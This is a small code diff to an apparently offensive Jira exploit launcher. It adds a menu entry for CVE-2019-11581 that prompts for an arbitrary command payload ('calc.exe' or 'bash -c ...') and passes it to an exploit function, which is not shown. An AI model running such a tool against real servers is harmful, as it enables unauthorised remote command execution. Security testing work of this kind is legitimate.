@@ -90,7 +90,8 @@ def main():
 				'\n\n'
 				'1. CVE-2017-9506 [HIGH]\n'
 				'2. CVE-2019-8449 [LOW]\n'
-				'3. CVE-2019-8451 [HIGH]'
+				'3. CVE-2019-8451 [HIGH]\n'
+				'4. CVE-2019-11581 [CRITICAL]'
 			)
 			print(style.GREEN(EXMSG) + style.RESET(''))
 			exploit = input(style.GREEN("    ----> ") + style.RESET('')).strip()
@@ -100,6 +101,13 @@ def main():
 				cve2019_8449(target)
 			elif exploit == '3':
 				cve2019_8451(target)
+			elif exploit == '4':
+				print("[*] Input the payload (spawning harmless 'calc.exe', or maybe bash -c '...')")
+				command = input("Enter the payload (default: calc.exe): ")
+				if command:
+					cve2019_11581(target, command)
+				else:
+					cve2019_11581(target)
 			else:
 				print(style.RED("[-] Invalid option selected. Quitting.") + style.RESET(''))
 
